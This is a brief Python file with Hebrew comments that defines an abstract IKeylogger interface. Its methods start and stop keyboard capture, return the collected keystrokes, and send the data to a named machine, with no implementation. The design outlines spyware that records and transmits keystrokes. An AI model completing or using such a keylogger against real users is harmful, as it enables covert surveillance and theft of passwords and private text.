#זהו הממשק של התוכנית

from abc import ABC, abstractmethod
from typing import List

import iwriter


class IKeylogger(ABC):
    @abstractmethod
    def start_logging(self) ->None:  #הפעלת האזנה למקלדת
        pass

    @abstractmethod
    def stop_logging(self) -> None:  # הפסקת האזנה
        pass

    @abstractmethod
    def get_logging_keys(self) -> List[str]:   #מחזיר רשימה עם כל ההקשות שנאספו
        pass

    @abstractmethod
    def send_data(self, data: str, machine_name: str) -> None:
        pass
